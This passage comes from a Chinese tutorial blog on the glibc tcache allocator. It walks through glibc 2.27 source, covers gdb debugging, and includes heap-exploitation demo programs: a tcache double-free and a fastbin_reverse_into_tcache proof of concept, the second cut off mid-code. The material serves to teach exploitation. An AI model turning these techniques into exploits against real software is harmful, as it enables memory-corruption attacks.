<p>需要注意的是这里的 next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</p>
<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>
<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p>
<ul>
<li><code>tcache_entry</code> 用<strong>单向链表</strong>的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>
<li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，<strong>每条链上最多可以有 7 个 chunk</strong>。</li>
</ul>
<p>用图表示大概是：</p>
<p><img data-src="/../images/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt="img"></p>
<h3 id="基本工作方式"><a href="#基本工作方式" class="headerlink" title="基本工作方式"></a>基本工作方式</h3><ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
<li>free 内存，且 size 小于 small bin size 时</li>
<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 后：<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（<strong>默认是 7 个</strong>）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（<strong>不取消 inuse bit</strong>）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空</li>
<li>tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk**，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中**，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
<li>tcache最多由64个bins链接而成，而每一个bins中最多放7个chunk</li>
<li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次</li>
<li>这也就意味着我们最大的chunk必须小于0x410,也就是我们申请的size要小于0x408(64位机上)</li>
</ol>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>接下来从2.27源码的角度分析一下 tcache。</p>
<h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>第一次 malloc 时，会进入到 <code>MAYBE_INIT_TCACHE ()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span></span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化 tcache</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="comment">// 根据 size 得到的 idx 在合法的范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// tcache-&gt;entries[tc_idx] 有 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="tcache-init"><a href="#tcache-init" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>其中 <code>MAYBE_INIT_TCACHE ()</code> 在 tcache 为空（即第一次 malloc）时调用了 <code>tcache_init()</code>，直接查看 <code>tcache_init()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tcache_init(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_init()</code> 成功返回后，<code>tcache_perthread_struct</code> 就被成功建立了。</p>
<h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><p>接下来将进入申请内存的步骤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// 由 size 计算的 idx 在合法范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 进入与无 tcache 时类似的流程</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p>
<h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>看一下 <code>tcache_get()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</p>
<h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h4><p>看完申请，再看看有 tcache 时的释放</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</p>
<h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free()"></a>_int_free()</h4><p>跟进 <code>_int_free()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是<strong>要释放的 chunk</strong> 和<strong>该 chunk 对应的 size 在 tcache 中的下标</strong>。</p>
<h4 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</p>
<h3 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h3><p>上面的应该是glibc2.27的源码，来自ctf-wiki</p>
<p>首先，来理解一下新增的两个结构体<code>tcache_entry</code>和<code>tcache_perthread_struct</code>。</p>
<h4 id="tcache-entry-1"><a href="#tcache-entry-1" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>这里的<code>t</code>是 thread即线程，<code>cache</code> 是缓存，<code>entry</code>是条目，所以顾名思义 tcache_entry 就是线程缓存的条目。</p>
<p>条目是什么意思呢？如下：</p>
<ol>
<li><p><strong>文献和书籍</strong>：在字典、百科全书、参考书籍等中，“条目”指的是对某一特定词汇、概念或主题的解释或描述。例如，字典中的每一个词汇及其定义都可以称为一个条目。</p>
</li>
<li><p><strong>清单和目录</strong>：在清单或目录中，“条目”指的是其中的各个项目或元素，比如商品清单中的每一项商品都可以被称为一个条目。</p>
</li>
<li><p><strong>数据库</strong>：在数据库管理中，一个“条目”指的是数据库中的一条记录，通常包含多个字段的信息。</p>
</li>
</ol>
<p>总之，“条目”强调的是在某个系统或结构中被标识和记录的一个单位，通常与其他条目一起形成一个完整的集合。</p>
<hr>
<p><img data-src="/../images/image-20250320214550152.png" alt="image-20250320214550152"></p>
<p>这个tcache_entry就应该是像上面这样的单链表结构，</p>
<h4 id="tcache-perthread-struct-1"><a href="#tcache-perthread-struct-1" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><p>这个的意思就是 每个线程的线程缓存的结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个线程都有一个这样的结构体，它包含了每个线程的缓存（因此称为“tcache_perthread_struct”）。</p>
<p>Glibc在2.26中加入了tcache，它对每个线程增加一个bin缓存，这样能显著提高性能，默认情况下，<strong>每个线程有64个bins，以16(8)递增，msize从24(12)到1032(516)</strong>。</p>
<ul>
<li><code>char counts[TCACHE_MAX_BINS];</code><ul>
<li><code>counts</code> 数组用于跟踪每个 bins 中已分配块的数量。每个索引对应于一个特定大小的内存块。</li>
</ul>
</li>
<li><code>tcache_entry *entries[TCACHE_MAX_BINS];</code><ul>
<li><code>entries</code> 数组用于存储指向 chunk 的指针。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>TCACHE_MAX_BINS</code> 被定义为 64，表示缓存可以有最多 64 个bins。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__thread</code> 关键字用于声明 <code>tcache</code> 为线程局部存储变量，这意味着每个线程都有自己独立的 <code>tcache</code> 实例。</li>
<li><code>tcache</code> 初始化为 <code>NULL</code>，表示还没有为其分配内存或没有初始化。</li>
</ul>
<h4 id="tcache-init-1"><a href="#tcache-init-1" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>在这个函数中注意到这两行代码<code>const size_t bytes = sizeof (tcache_perthread_struct); victim = _int_malloc (ar_ptr, bytes);</code></p>
<p>在第一次调用 malloc() 时，系统分配 heap 区域后分配了一个大小为<code>sizeof(tcache_perthread_struct) = 0x241(583)</code>的chunk，它就是每个线程中用于 tcache 机制的一块内存空间。</p>
<h4 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>在<code>__libc_malloc()</code>开头被调用，这个就是用于从 tcache 中获取一个被 free 的 chunk。</p>
<h4 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><p>在<code>_int_free()</code>中被调用，这个用于将一个内存块放回tcache中。</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><h5 id="什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？"><a href="#什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？" class="headerlink" title="什么情况下会调用 tcache_get 函数数值（什么情况下会到 tcache 中查找 chunk）？"></a>什么情况下会调用 <code>tcache_get</code> 函数数值（什么情况下会到 tcache 中查找 chunk）？</h5><ol>
<li>在调用 <code>malloc_hook</code> 之前，<code>int_malloc</code> 之前，如果 <code>tcache</code> 中有合适的 chunk，那么就从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code>，若 <code>tcache bin</code> 有对应大小的 chunk，从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code> 时，如果大小不匹配，<code>chunk</code> 会被放入对应的 <code>bins</code>，若达到 <code>tcache_unsorted_limit</code> 限制之前已经存入 <code>chunk</code> 就此被取出（默认限制）。</li>
</ol>
<p>在内存分配的 <code>malloc</code> 函数中，会将内存块移入 <code>tcache</code> 中。</p>
<h5 id="tcache-的功能"><a href="#tcache-的功能" class="headerlink" title="tcache 的功能"></a>tcache 的功能</h5><ol>
<li>首先，申请的内存块符合 <code>fastbin</code> 大小并且在 <code>fastbin</code> 内找到可用的空闲块时，会把 <code>fastbin</code> 链表的其他内存块放入 <code>tcache</code> 中。</li>
<li>其次，申请的内存块符合 <code>smallbin</code> 大小并且在 <code>smallbin</code> 内找到可用的空闲块时，会把 <code>smallbin</code> 链上的其他内存块放入 <code>tcache</code> 中。</li>
<li>第三，针对 <code>unsorted bin</code> 链上有合适的链块时，并不直接返回，而是先放到 <code>tcache</code> 中，继续处理。上面的情况将 <code>chunk</code> 放入 <code>tcache</code> 中，在将合适的 <code>chunk</code> 返回时利用。</li>
</ol>
<p>在 <code>tcache_get</code> 中，<strong>仅仅检查了 <code>tck_idx</code></strong>，前面说过，可以将 <code>tcache</code> 当作一个类似于 <code>fastbin</code> 的单独链表，只是它的 <code>check</code> 并没有复用，因此我们可以利用这一点来进行 <code>attack</code>。</p>
<p> <strong>tcache 遵循“后进先出”，从头部插入，尾部取出</strong></p>
<h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>通过下面这段程序再来理解一下tcache，环境：ubuntu 18.04</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o struct struct.c -g</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li>运行到 malloc(0) 直接一直 si 中间的call注意一下 n 跳过。</li>
<li>一直到如下所示 si 进入</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78b66 &lt;malloc_hook_ini+374&gt;    call   tcache_init.part                &lt;tcache_init.part&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在一直si到</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78460 &lt;tcache_init.part+80&gt;     call   _int_malloc                &lt;_int_malloc&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>用 n 到下一步，再用 heap 就可以看到系统分配了 heap 和这个 tcache_perthread_struct 的 chunk。</li>
</ul>
<img data-src="../images/image-20250320221542108.png" alt="image-20250320221542108" style="zoom: 50%;" />

<h3 id="glibc-tcache变化"><a href="#glibc-tcache变化" class="headerlink" title="glibc_tcache变化"></a>glibc_tcache变化</h3><ul>
<li>glibc2.26中引入tcache</li>
<li>glibc2.27中正式应用了tcache</li>
<li>glibc2.29中加入了检查tcache的double_free的机制，tcache_get()中加入了key变量</li>
</ul>
<h2 id="攻击原理demo"><a href="#攻击原理demo" class="headerlink" title="攻击原理demo"></a>攻击原理demo</h2><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h3><p>本demo是一个简单的利用tcache的double-free attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我们知道在Fastbin attack的时候我们是不能依次free两次同一块chunk的，但是tcache可以</p>
<p>这是为什么呢？原因也很简单，从tcache_put函数可以看出，它几乎没有设置任何检查，也就意味着我们无需做任何事就可以对同一个chunk进行多次的free，相比fastbin_dup来说，tcache_dup的利用更加的简单了</p>
<p>然后我们再malloc两次就可以得到同一块内存的chunk</p>
<p>对本程序而言，程序先malloc了一个chunk a(size&#x3D;8)</p>
<p>然后连续Free两次chunk a,此时在free list中就会链入两次chunk a</p>
<p>这个时候我们再申请两次chunk就可以将两次的chunk a全部拿出来了</p>
<h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><p>条件：堆溢出 或 UAF</p>
<p>效果：任意地址分配改写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>; <span class="comment">// 定义分配大小为64字节</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;本攻击效果类似于unsorted_bin_attack，但适用于小内存分配（allocsize &lt;= 0x78）。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;目标是构造特定条件使得调用malloc(allocsize)时会将一个超大无符号值写入栈。\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配14个指针用于后续释放</span></span><br><span class="line">    <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;首先我们需要至少free释放7次来填满tcache。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;（超过7次也可以正常工作）\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填满tcache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;接下来要释放的指针是我们要篡改的chunk：%p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;现在或稍后篡改都可以。因为tcache已满，它会被放入fastbin。\n\n&quot;</span>,</span><br><span class="line">        victim</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;接下来需要再释放1到6个指针。这些也会进入fastbin。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;如果我们要覆盖的栈地址值不是零，则需要精确释放6次，否则会导致段错误。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;但如果栈上的值是零，则只需要释放1次。\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span 